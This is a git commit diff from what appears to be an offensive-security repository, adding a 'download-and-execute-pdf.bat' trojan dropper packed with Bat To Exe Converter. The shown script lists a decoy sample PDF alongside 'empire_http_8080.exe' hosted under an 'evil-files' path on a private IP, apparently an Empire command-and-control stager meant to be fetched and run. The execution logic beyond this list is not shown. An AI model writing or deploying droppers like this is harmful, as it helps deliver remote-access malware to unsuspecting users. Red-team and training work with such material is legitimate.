42fd1807356aa218bf47965ee3700309b63475d0
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-07-12 22:46:49 +0200

    towards simple trojans

--- deliver/download-and-execute-pdf.bat
+++ deliver/download-and-execute-pdf.bat
@@ -1,3 +1,36 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdDWDJFGL+UcMJhJaTTiyJWiyB6cR2Pr05e+Etl4hWustaobf06CyJOUf41PhZ6o90nwXkcgDAlVRfR3L
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdDWDJFGL+UcMJhJaTTiyJWiyB6cR2Pr05e+Etl4hWustaobf06CyJOUf41PhZ6op2W1UlMQNCCRZcBaUaxcxqntWs1uVM8HSthfkKg==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 
 set files='https://filesamples.com/samples/document/pdf/sample3.pdf','https://192.168.122.108/evil-files/empire_http_8080.exe'
